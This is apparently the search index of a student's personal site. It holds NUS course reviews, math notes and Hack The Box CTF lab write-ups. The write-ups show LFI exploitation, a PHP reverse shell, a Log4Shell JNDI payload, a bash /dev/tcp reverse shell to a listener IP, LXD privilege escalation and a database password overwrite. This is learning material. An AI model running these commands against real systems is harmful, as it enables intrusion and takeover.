{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"Hi there \ud83d\udc4b!","text":"<p>I am Gabriella Gloria, an Indonesian undergraduate at NUS \ud83c\udf93. I am majoring in Computer Science \ud83d\udcbb, currently a Y2 student :D! I am still exploring many CS fields and hope to learn more throughout uni.</p> <p>My interest (currently) lies in Cybersecurity, but I did a bit of Competitive Programming back then (C++ best language I agree \ud83d\ude17\ud83d\udd1b\ud83d\udd1d). Oh, I also like chocolates \ud83c\udf6b and sushi \ud83c\udf63.</p>"},{"location":"index.html#eryz-notes","title":"eryz-notes \ud83d\ude47\u200d\u2640\ufe0f","text":"<p>This page is just for me to document things and also my progress, so in the next few years, I can look back &amp; see how stupid and cringe I was. </p> <p>Idk how you found this page, but thanks for visiting, hope you enjoyed it \ud83e\udef6!!</p>"},{"location":"index.html#socials","title":"Socials \ud83d\ude4c","text":"<p>Feel free to connect with me :D</p> <ul> <li><code>Github</code> - GabriellaGloria</li> <li><code>Email</code> - gabriella@u.nus.edu</li> </ul>"},{"location":"CTF/HTB/Starting-Point/Included.html","title":"Included Writeup","text":"<p>First, we need to spawn the target machine. When we open the target on browser, we will see this :</p> <p>We noticed that our url changed to /?file=home.php, which might be vulnerable to local file inclusion (LFI). </p> Local File Inclusion <p> Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application.</p> <p> LFI attacks are used by attackers to trick a web application into running or exposing files on a web server. If the attack is successful, it will expose sensitive information, and in severe cases, can lead to XSS and remote code execution.</p> <p>We can try different paths to check if it is indeed vulnerable. One example that we can try is <code>/etc/passwd</code> since it should exist &amp; readable to everyone.</p> About /etc/passwd <p>The `/etc/passwd` file is like the ID card for users on a Unix system! Here's why it's important:</p> <ul> <li>User Info: Contains username, user ID (UID), group ID (GID), full name, home directory, and login shell.</li> <li>Permissions: Readable by all, but only admins can modify it.</li> <li>Format: Each user's data is on a line, separated by colons.</li> <li>Evolution: Historically stored passwords, but now they\u2019re moved to `/etc/shadow` for security.</li> </ul> <p>Fun fact: If changed, a backup file like `/etc/passwd-` is created automatically!</p> <p> and yes, here we can see the users! There are 2 interesting users here, mike and tftp. </p> <p>TFTP stands for Trivial File Transfer Protocol. It is a simple way to transfer files between servers and computers. TFTP is faster than some other protocols, but also less secure. It's generally used for transferring small files. TFTP runs using UDP with default port 69.</p> <p>TFTP does not have built-in encryption, access control or authentication. This makes it very easy for an attacker to trick TFTP into giving access to files. Anyone can connect, download, and upload to the remote TFTP system.</p> About UDP : <p>How It Works:   UDP is a lightweight protocol that operates on top of the Internet Protocol (IP). It sends packets (units of data) directly to a target computer without establishing a connection first. This allows for faster data transfer speeds, but it can also lead to lost packets and other issues.</p> <p>When It\u2019s Used:   UDP is often used for time-sensitive applications like gaming, video streaming, and DNS lookups. It's also used for Remote Procedure Call (RPC) applications.</p> <p>Advantages:   UDP is faster than other protocols and requires fewer resources. It also allows missing packets, which is useful for real-time communications.</p> <p>Disadvantages:   UDP is less reliable than other protocols like Transmission Control Protocol (TCP). It doesn't guarantee that packets will arrive in order or be delivered at all. UDP also doesn't have congestion control mechanisms, so it can flood a network with packets if not used carefully.</p> <p>Packet Structure:   Each UDP packet has a source port, destination port, length, checksum, and data.</p>","tags":["Hack The Box","CTF","Apache","PHP"]},{"location":"CTF/HTB/Starting-Point/Included.html#foothold","title":"Foothold","text":"<p>We can try to upload a script to the TFTP, and load it using the LFI vulnerability. Here, we will use PHP reverse shell script (In my case, its already in /usr/share/webshell/php/php-reverse-shell.php). </p> <p>Note : edit the shell's IP first to your tun0 ip (10.10.14.61 to me), and the listening port to any port you want to listen to (I usually use 1443). To see your tun0 ip, use <code>ifconfig</code>'s tun0 inet IP.</p> <p>We need to install TFTP first by : <pre><code>sudo apt install tftp\n</code></pre> Then, we can connect to the target's tftp and upload our shell!  After uploading, we can set up our nc listener using nc : <pre><code>nc -lvnp 1443\n</code></pre> Since we know that tftp home directory is <code>/var/lib/tftpboot</code> (from the <code>/etc/passwd</code> shown above), we know that our shell_php.php is uploaded there!</p> <p>Hence, we can load it using curl, or just browse the path (<code>http://&lt;TARGET_IP&gt;/?file=/var/lib/tftpboot/shell_php.php</code>). Now, our listener connected to the shell!</p> <p></p> <p>We can upgrade our shell to make it look better using <pre><code>python3 -c \"import pty; pty.spawn('/bin/bash');\"\n</code></pre> We are currently accessed to <code>www-data</code> user, and don't have much privileges</p> About www-data &amp; /var/www/html <p>www-data: A default system user/group used by web servers like Apache or Nginx to run web services. It minimizes security risks by isolating web server processes from other system processes.</p> <p>/var/www/html: The default directory for serving web content in Linux distributions. It\u2019s where you place website files (HTML, PHP, etc.) to make them accessible via a web server.  Together, www-data owns or manages /var/www/html to host websites securely while restricting unnecessary access.</p>","tags":["Hack The Box","CTF","Apache","PHP"]},{"location":"CTF/HTB/Starting-Point/Included.html#privilege-escalation","title":"Privilege Escalation","text":"<p>Now, if we can try exploring user's capability &amp; files, and we get this!</p> <p>User <code>mike</code> might be using the same password, so we try to switch user to mike using <code>su</code>.</p> <p>and we're authenticated as mike!</p> <p>Here is our user flag.</p> <p>Using <code>id</code> command, we can see that mike belongs to lxd group. Through google search, we can find about lxd exploitations and turns out we can escalate privileges to root (without any sudo rights/passwords). </p> <p>Here, I will follow the HackTricks page Method 2. (I tried using method 1 first, but the build-lxd isnt supported anymore, then I git checkout to get the previous distrobuilder, but failed again since my architecture <code>arm64</code> not supported, I gave up method 1 since it also takes me so long to download qemu &amp; docker to emulate amd64)</p> <p>Method 1 fail compilation :</p> <p>Method 2 : <pre><code># Build an Alpine image and start it using the flag security.privileged=true\n# forcing the container to interact as root with the host filesystem.\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder\nsed -i 's,yaml_path=\"latest-stable/releases/$apk_arch/latest-releases.yaml\",yaml_path=\"v3.8/releases/$apk_arch/latest-releases.yaml\",' build-alpine\nsudo ./build-alpine -a i686\n</code></pre> To use these files, we need to transfer it to the target. We can start a python http.server &amp; get our files using wget <pre><code>python3 -m http.server 8000\n</code></pre> <pre><code>wget http://OUR_IP:8000/alpine&lt;IMAGE_NAME_HERE&gt;.tar.gz\n</code></pre> Note : start it at the lxd-alpine-builder directory, since we need to get the image from target which is located there.</p> <p>On our machine : </p> <p>On target machine :</p> <p>After transferring, we can do : <pre><code># import the image\nlxc image import ./alpine&lt;IMAGE_NAME_HERE&gt;.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.\n\n# before running the image, start and configure the lxd storage pool as default \nlxd init\n\n# run the image\nlxc init myimage mycontainer -c security.privileged=true\n\n# mount the /root into the image\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n</code></pre> And lastly, we can start it using this, yayayyy!! <pre><code>lxc start mycontainer\nlxc exec mycontainer /bin/sh\ncd /mnt/root #Here is where the filesystem is mounted\n</code></pre></p> <p>The root flag is in <code>/mnt/root/root/</code> since it's mounted there</p> What is a Mount?<p> A mount makes a file system, directory, or device available to an operating system at a specific point in its directory tree. In this case, it links the host\u2019s / directory to the container\u2019s /mnt/root directory, enabling the container to access files from the host system.</p>","tags":["Hack The Box","CTF","Apache","PHP"]},{"location":"CTF/HTB/Starting-Point/Unified.html","title":"Unified Writeup","text":"<p>We spawn the target machine  and identify open ports using nmap : <p><pre><code>nmap &lt;TARGET_IP&gt; -p-\n</code></pre> Note : -p- to scan all TCP ports</p> <p>We will get ports 80, 6789, 8080, and 8443</p> <p>To view more about each port details, we can use -sC and -sV</p> <pre><code>nmap &lt;TARGET_IP&gt; -p 8443 -sC\n</code></pre> <p>This tells us that port 8443 is running Unifi Network</p> <p>When we visit https://TARGET_IP:8443, we will see this login page</p> <p>If we look for the vulnerabilities of this unifi version, we will find this CVE related to Log4j2, called Log4Shell.</p> <pre><code>logger.debug(\"This is a DEBUG message.\");\nlogger.info(\"This is an INFO message.\");\nlogger.warn(\"This is a WARN message.\");\n</code></pre> <p>This vulnerability can be exploited to give a reverse shell. It works by exploiting improper input handling in log messages format. Log4j allows message lookup through JNDI (Java Naming and Directory Interface). JNDI allows lookup from databases, services, network and directories, including LDAP (Lightweight Directory Access Protocol) to retrieve resources.</p> <p>Malicious input could contain JNDI Lookup string such as :</p> <p><pre><code>${jndi:ldap://malicious-server.com/exploit}\n</code></pre> When this is logged by vulnerable log4j instance, it will trigger log4j JNDI feature to connect to malicious server (could be attacker's machine).</p> <p>We will try to login to the page, and intercept our request using BurpSuite. We will try to connect to our IP (tun0 from HTB).</p> <p></p> <p>Here, I used tcpdump to analyze my network traffic. It is a command line version of Wireshark. <pre><code>Tcpdump is a command line utility that allows you to capture and analyze network traffic going through your system. It is often used to help troubleshoot network issues, as well as a security tool.\n</code></pre> Since LDAP runs in port 389, we will listen on port 389. And indeed, there is a connection to port 389 to our machine. Hence, we know that it is vulnerable to Log4Shell.</p> <p>I use rogue-jndi to deliver our payload. To setup : <pre><code>git clone https://github.com/veracode-research/rogue-jndi\ncd rogue-jndi\nmvn package\n</code></pre></p> <p>A Rogue JNDI attack occurs when an attacker sets up a malicious server (e.g., an LDAP or RMI server) to respond to a JNDI lookup with malicious payloads. When the vulnerable application performs a lookup, it retrieves and executes the payload, enabling the attacker to execute arbitrary code, steal data, or compromise the system.</p> <p>Here, we will send a reverse shell payload (base64 encoded to avoid encoding issues) : <pre><code>echo 'bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.61/1443 0&gt;&amp;1' | base64\n</code></pre></p> <p>After encrypting the payload, we will send it using rogue-jndi by : <pre><code>java -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,&lt;PAYLOAD_HERE&gt;}|{base64,-d}|{bash,-i}\" --hostname \"10.10.14.61\"\n</code></pre> Change the IP accordingly to your tun0 IP, and port 1443 can be any port to listen to. We will set a listener using nc : <pre><code>nc -lvnp 1443\n</code></pre></p> <p>Then, we will use the ldap://10.10.14.61:1389/o=tomcat provided by the rogue-jndi and send it to the page again. </p> <p>Now, we can see our nc is connected to the shell! Lets upgrade the shell by using : <pre><code>script /dev/null -c bash\n</code></pre> script creates a new pseudo terminal (PTY). /dev/null is to ensure that the logs is not saved (PTY without logging).  -c bash to start bash shell in the pseudo terminal.</p> <p>Here is our user.txt!</p>","tags":["Hack The Box","CTF","MongoDB"]},{"location":"CTF/HTB/Starting-Point/Unified.html#privilege-escalation","title":"Privilege Escalation","text":"<p>To see the running processes, we can use the ps command</p> <p>The ps command in Linux is a powerful tool that allows you to view information about the processes running on your Linux system. It stands for \u201cprocess status\u201d and it's a command that you can use from the command line to get information about the currently running processes.</p> <p>When we use ps aux, we notice that target uses mongo database.</p> Understanding ps aux <p>ps: Stands for \"process status.\" It is a command used to display information about active processes in the system.</p> <p>a: This option tells ps to show processes for all users, not just the current user. By default, without this flag, ps only shows processes running under the current user\u2019s session.</p> <p>u: This option tells ps to display user-oriented output. This includes the username of the process owner, CPU usage, memory usage, start time, etc.</p> <p>x: This option tells ps to show processes that are not attached to a terminal. These could include background processes, system services, or daemons.</p> <pre><code>ps aux | grep mongo\n</code></pre> <p> It shows that mongodb runs on the port 27117.</p> <p>Unifi Network default database name is ace. We will connect to the database and run some commands as shown.</p> <p>We can enumerate the users, and find admin (the output is quite long so i grep it in here).</p> <p>The password is in x_shadow and sha-512 (from the <code>$6$</code> prepended), and we cant crack it. So instead, we will just change it directly to our password. </p> <p>Copy the password over, and update the database : <pre><code>mongo --port 27117 ace --eval 'db.admin.update({\"_id\":\nObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"SHA_512 Hash Generated\"}})'\n</code></pre> </p> <p>Now, if we try to login again, using <code>adminstrator</code> and our password (<code>eryz_pass</code> in my case), we are authenticated!  And SSH login is enabled to root, using <code>NotACrackablePassword4U2022</code></p> <p>Here is our flag :D</p>","tags":["Hack The Box","CTF","MongoDB"]},{"location":"CTF/HTB/Starting-Point/Vaccine.html","title":"Vaccine Writeup","text":"<p>1) We spawn the target machine  2) Enumerate target using Nmap     (-sV to give more details about the version) <pre><code>nmap &lt;TARGET_IP&gt; -sV\n</code></pre> <p>We can see the open ports (21, 22, 80).</p> <p>3) We try to login as anonymous (-a for anon login) to the ftp server <pre><code>ftp &lt;TARGET_IP&gt; -a\n</code></pre> </p> <p>We can see that there is a backup.zip, and we will get that using get command to download to our local <pre><code>get backup.zip\n</code></pre> </p> <p>The zip needs a password, and since we don't know it, we can try few common passwords or bruteforce using password cracking tools.</p> <p>Here, I will use John The Ripper's zip2john : <pre><code>zip2john backup.zip &gt; backup_hash.txt\n</code></pre> which processes the zip &amp; extract the necessary hash Then, we can use  <pre><code>john backup_hash.txt --wordlist=/path/to/wordlist\n</code></pre>  Yay, we find the password !</p> <p>Now, lets see whats inside the zip! Unzip the zip first using <pre><code>unzip backup.zip\n</code></pre> and we will get a index.php and style.css </p> <p>in the index.php, there is a md5 hashed password, we can decrypt it using online decryptor, and get the password qwerty789 :D</p> <p>Now, we can login to the target, and we can see a table in the dashboard. This might be connected to database, and we'll try to inject SQL injections.</p> <p>To test if its injectable, we can use sqlmap</p> <p></p> <p>We will give our cookie for our sqlmap to authenticate &amp; search the query</p> <pre><code>sqlmap -u 'http://&lt;TARGET_IP&gt;/dashboard.php?search=a' --cookie=\"PHPSESSID=&lt;INSERT_COOKIE&gt;\"\n</code></pre>","tags":["Hack The Box","CTF","SQL Injection","FTP","Sudo","PHP"]},{"location":"NUS/CS1010.html","title":"CS1010","text":"","tags":["NUS","CS"]},{"location":"NUS/CS1010.html#about-cs1010-programming-methodology","title":"About CS1010 - Programming Methodology \ud83e\udd1f","text":"<p>CS1010 Docs : link CS1010 NUSMods : link</p> <p>I took CS1010 in AY2324 Semester 1, under Prof Wei Tsang and taught CS1010 in AY2425 Semester 1 as a TA. I enjoyed how this course is structured, and in my opinion its the best 1010 course (hehe, I'm biased tho \ud83d\ude3c). It was my first time learning memory management &amp; allocations.</p> <p>CS1010 is an introductory course to programming, using C language. The course primarily focuses on C programming, algorithm design (flowcharts), memory management, and problem-solving. Topics covered include conditionals, loops, arrays, pointers, recursion, and data structures, with an emphasis on developing efficient and maintainable code. Students also learn to use Unix tools and GitHub for collaboration, along with a specialized CS1010 I/O library. The course is designed to build a strong programming foundation for those new to coding.</p> <p>This course has 3 Programming exams, Midterm, and Finals. There are also weekly quizzes on Canvas and 8 programming assignments. I scored quite well on midterm and PEs, but my final score was bad \ud83d\ude14.</p> <p>Overall CS1010 was such a fun module!</p> <p>Enjoyment : 4.5/5 \ud83e\udef6 Workload : 5-7h/week (2h lecture, 2h lab, 2h assignment &amp; quizzes) Grade : A</p>","tags":["NUS","CS"]},{"location":"NUS/CS1231S.html","title":"CS1231S","text":"","tags":["NUS","CS"]},{"location":"NUS/CS1231S.html#about-cs1231s-discrete-structures","title":"About CS1231S - Discrete Structures \ud83d\udc23","text":"<p>CS1231S NUSMods : link</p> <p>I took CS1231S in AY2324 Semester 2, under Prof Aaron Tan. </p> <p>CS1231S introduces key mathematical concepts crucial for computer science, including logic, set theory, functions, infinite numbers, combinatorics, and graph theory. Students learn proof techniques like induction and contradiction and explore applications of these structures in computing. By focusing on abstraction and problem-solving, the course builds a foundation for understanding algorithms, data structures, and theoretical aspects of computer science, making it integral for further studies in the field \ud83d\udc85.</p> <p>This course has 2 written assignments, Midterms and Finals. Midtems &amp; Finals are openbook (printed materials), using pen &amp; paper \ud83e\udd27.</p> <p>I personally liked how Prof Aaron explains the topics, and giving great examples for the concepts. He explained everything really well, so it was easy to understand. Most of the topics are already familiar to me, but I wish I could learn these from him before.</p> <p>I never skipped the lectures (probably 1/2 i forgot..) since I really enjoyed it \ud83d\udc4d! The tutorial questions are also nice (i only skip when i cant wake up \ud83d\ude42\u200d\u2195\ufe0f..)</p> <p>Oh, I got chocolate from Prof Aaron for participating in the Monty Hall lecture \ud83d\ude0e!</p> <p>Enjoyment : 5/5 \ud83e\udef6 Workload : 4-5h/week (2h lecture, 1h tutorial, 1h assignment) Grade : A+</p>","tags":["NUS","CS"]},{"location":"NUS/CS2040S.html","title":"CS2040S","text":"","tags":["NUS","CS"]},{"location":"NUS/CS2040S.html#about-cs2040s-data-structures-algorithms","title":"About CS2040S - Data Structures &amp; Algorithms \ud83d\udcd6","text":"<p>CS2040S NUSMods : link</p> <p>I took CS2040S in AY2324 Semester 2, under Prof Seth Gilbert &amp; Prof Arnab Bhattacharya. </p> <p>CS2040S covers topics about data structure and algorithms design and analysis. First lecture is introduction to Java, but it was not tested (it is not main focus of this course). The course teaches various data structures (like trees, graphs, tries, and heaps), algorithmic techniques (including DFS, BFS, dynamic programming and greedy algorithms), and complexity analysis. It aims to build strong problem-solving skills and prepares students for tackling real-world computational challenges. </p> <p>This course has Midterms and Finals. Assignments are given on Coursemology. There are weekly coding assignments &amp; quizzes. Again, I scored quite well on Midterms but my final was quite bad \ud83e\udd27. The coding assignments uses Java.</p> <p>Personally, I think each topic is quite rushed, but everything is still well taught (I liked the tree topics part) \ud83c\udf34. I also liked the tutorial questions, it was quite challenging and fun!</p> <p>Enjoyment : 4/5 \ud83e\udef6 Workload : 5-7h/week (2h lecture, 2h tutorials, 2h assignment &amp; quizzes) Grade : A</p>","tags":["NUS","CS"]},{"location":"NUS/CS2100.html","title":"CS2100","text":"","tags":["NUS","CS"]},{"location":"NUS/CS2100.html#about-cs2100-computer-organisation","title":"About CS2100 - Computer Organisation \ud83e\uddd1\u200d\ud83d\udcbb","text":"<p>CS2100 NUSMods : link</p> <p>I took CS2100 in AY2324 Semester 2, under Prof Aaron Tan. </p> <p>CS2100 introduces students to the fundamental principles of computer systems and architecture. The first half of this course mainly focuses on C introduction &amp; MIPS Assembly. The course explores topics such as digital logic circuits, data representation, machine-level instructions, ISA, and MIPS assembly language \ud83d\ude0e. CS2100 also explains about cache, pipelining, and sequential logic. By connecting high-level programming to low-level hardware operations, CS2100 bridges the gap between software and hardware, offering a understanding of how computers execute programs \ud83e\udee1.</p> <p>The lectures are online videos on Canvas, but there's offline weekly recitations. Each week has many content videos (around 2-4h worth of vids).</p> <p>This course has Midterms and Finals. There are also some quizzes &amp; written assignments on Canvas. Midtems &amp; Finals are openbook (printed materials), using Examplify \u2705.</p> <p>The topics covered in CS2100 were mostly new to me, and I personally liked it, although I find the questions were tedious, but CS2100 was a nice intro to lower level stuff \ud83d\udc93.</p> <p>Enjoyment : 4.5/5 \ud83e\udef6 Workload : 5-6h/week (3h lecture, 1h tutorial, 1h lab, 1h assignemnts) Grade : A</p>","tags":["NUS","CS"]},{"location":"NUS/mods.html","title":"Mods","text":"","tags":["NUS","CS"]},{"location":"NUS/mods.html#mods-ive-taken","title":"Mods I've taken \ud83e\udd1f","text":"","tags":["NUS","CS"]},{"location":"NUS/mods.html#ay2324-semester-1","title":"AY23/24 Semester 1","text":"Module Code Module Name CS1010 Programming Methodology CG1111A Engineering Principles and Practice I CFG1002 Career Catalyst EG1311 Design and Make ES1103 English for Academic Purposes MA1511 Engineering Calculus MA1512 Differential Equations For Engineering","tags":["NUS","CS"]},{"location":"NUS/mods.html#ay2324-semester-2","title":"AY23/24 Semester 2","text":"Module Code Module Name CS1231S Discrete Structures CS2040S Data Structures and Algorithms CS2100 Computer Organisation ES2660 Communicating in the Information Age GEA1000 Quantitative Reasoning with Data IS1108 Digital Ethics and Data Privacy MA1522 Linear Algebra for Computing ST2334 Probability and Statistics","tags":["NUS","CS"]},{"location":"NUS/mods.html#ay2425-semester-1","title":"AY24/25 Semester 1","text":"Module Code Module Name CS2105 Introduction to Computer Networks CS2106 Introduction to Operating Systems CS2107 Introduction to Information Security CS2109S Introduction to AI and Machine Learning CS2030S Programming Methodology II GEC1015 Public Health in Action","tags":["NUS","CS"]},{"location":"about/about.html","title":"About Me","text":"<p>Hi there :D</p> <p>I'm just an undergraduate in NUS</p>"},{"location":"blog/index.html","title":"Blogs","text":""},{"location":"blog/2024/11/15/buffer-overflow--format-string-vulnerabilities.html","title":"Buffer Overflow &amp; Format String Vulnerabilities","text":"","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html","title":"Combinatorics","text":"<p>just wanna dump some formulas here for me to review</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#binomial-theorem","title":"Binomial Theorem","text":"<p>The binomial theorem states: $$ (x + y)^n = \\sum_{k=0}^{n} \\binom{n}{k} x^{n-k} y^k $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#chinese-remainder-theorem","title":"Chinese Remainder Theorem","text":"<p>The Chinese Remainder Theorem states: $$ x \\equiv a_1 \\pmod{n_1}, \\quad x \\equiv a_2 \\pmod{n_2}, \\quad \\ldots, \\quad x \\equiv a_k \\pmod{n_k} $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#diophantine-equation","title":"Diophantine Equation","text":"<p>A linear Diophantine equation is of the form: $$ ax + by = c $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#discrete-logarithm","title":"Discrete Logarithm","text":"<p>The discrete logarithm problem is: $$ \\text{Given } a \\text{ and } b, \\text{ find } x \\text{ such that } a^x \\equiv b \\pmod{p} $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#eulers-theorem","title":"Euler's Theorem","text":"<p>Euler's theorem states: $$ a^{\\phi(n)} \\equiv 1 \\pmod{n} $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#euclids-theorem","title":"Euclid's Theorem","text":"<p>Euclid's theorem states: $$ \\text{There are infinitely many prime numbers.} $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#fermats-little-theorem","title":"Fermat's Little Theorem","text":"<p>Fermat's Little Theorem states: $$ a^{p-1} \\equiv 1 \\pmod{p} $$</p>","tags":["Random"]},{"location":"blog/2024/11/15/combinatorics.html#fermats-last-theorem","title":"Fermat's Last Theorem","text":"<p>Fermat's Last Theorem states: $$ x^n + y^n = z^n \\text{ has no integer solutions for } n &gt; 2 $$</p>","tags":["Random"]},{"location":"codes/cpp_is_love.html","title":"Cpp is love","text":""},{"location":"codes/cpp_is_love.html#i-like-cpp-3","title":"I like cpp &lt;3","text":"<p>isnt cpp best language !?? just a cpp code<pre><code>#include &lt;bits/stdc++.h&gt;\n#define int long long // im sorry i have to\n// this is my fav library &lt;3\n</code></pre></p>"},{"location":"blog/archive/2024.html","title":"2024","text":""},{"location":"blog/category/documentation.html","title":"Documentation","text":""},{"location":"tags.html","title":"Tags","text":""},{"location":"tags.html#apache","title":"Apache","text":"<ul> <li>Included</li> </ul>"},{"location":"tags.html#cs","title":"CS","text":"<ul> <li>CS1010</li> <li>CS1231S</li> <li>CS2030S</li> <li>CS2040S</li> <li>CS2100</li> <li>Mods</li> </ul>"},{"location":"tags.html#ctf","title":"CTF","text":"<ul> <li>Included</li> <li>Unified</li> <li>Vaccine</li> </ul>"},{"location":"tags.html#ftp","title":"FTP","text":"<ul> <li>Vaccine</li> </ul>"},{"location":"tags.html#hack-the-box","title":"Hack The Box","text":"<ul> <li>Included</li> <li>Unified</li> <li>Vaccine</li> </ul>"},{"location":"tags.html#mongodb","title":"MongoDB","text":"<ul> <li>Unified</li> </ul>"},{"location":"tags.html#nus","title":"NUS","text":"<ul> <li>CS1010</li> <li>CS1231S</li> <li>CS2030S</li> <li>CS2040S</li> <li>CS2100</li> <li>Mods</li> </ul>"},{"location":"tags.html#php","title":"PHP","text":"<ul> <li>Included</li> <li>Vaccine</li> </ul>"},{"location":"tags.html#random","title":"Random","text":"<ul> <li>Buffer Overflow &amp; Format String Vulnerabilities</li> <li>Combinatorics</li> </ul>"},{"location":"tags.html#sql-injection","title":"SQL Injection","text":"<ul> <li>Vaccine</li> </ul>"},{"location":"tags.html#sudo","title":"Sudo","text":"<ul> <li>Vaccine</li> </ul>"}]}